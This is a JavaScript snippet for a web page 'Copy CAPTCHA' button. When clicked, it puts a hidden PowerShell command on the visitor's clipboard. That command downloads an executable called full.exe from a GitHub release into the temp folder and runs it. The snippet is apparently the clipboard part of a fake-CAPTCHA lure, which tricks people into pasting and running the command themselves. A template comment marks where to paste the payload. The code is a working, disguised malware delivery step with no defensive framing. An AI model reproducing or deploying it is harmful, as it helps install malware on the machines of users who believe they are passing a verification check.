const copyButton =
    document.getElementById("copyButton");
const copyStatus =
    document.getElementById("copyStatus");
copyButton.addEventListener("click", async () => {
    // ↓↓↓ PASTE THE TEXT YOU WANT COPIED BETWEEN THE QUOTES BELOW ↓↓↓
    const text = `powershell -nop -w h -c "$u='https://github.com/skibidislicer105/steel9999/releases/download/h/full.exe';$p=$env:TEMP+'\full.exe';(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p -WorkingDirectory $env:TEMP"`;
    // ↑↑↑ PASTE THE TEXT YOU WANT COPIED BETWEEN THE QUOTES ABOVE ↑↑↑

    try {
        if (
            navigator.clipboard &&
            window.isSecureContext
        ) {
            await navigator.clipboard.writeText(text);
        } else {
            const textarea =
                document.createElement("textarea");
            textarea.value = text;
            textarea.setAttribute(
                "readonly",
                ""
            );
            textarea.style.position = "fixed";
            textarea.style.left = "-9999px";
            textarea.style.top = "0";
            document.body.appendChild(textarea);
            textarea.focus();
            textarea.select();
            const copied =
                document.execCommand("copy");
            document.body.removeChild(textarea);
            if (!copied) {
                throw new Error("Fallback copy failed");
            }
        }
        copyButton.textContent =
            "Copied ✓";
        copyStatus.textContent =
            "Copied code to your clipboard.";
        setTimeout(() => {
            copyButton.textContent =
                "Copy CAPTCHA";
        }, 2000);
    } catch (error) {
        console.error(
            "Clipboard error:",
            error
        );
        copyStatus.textContent =
            "Copy failed. Check your browser's clipboard permissions.";
    }
});
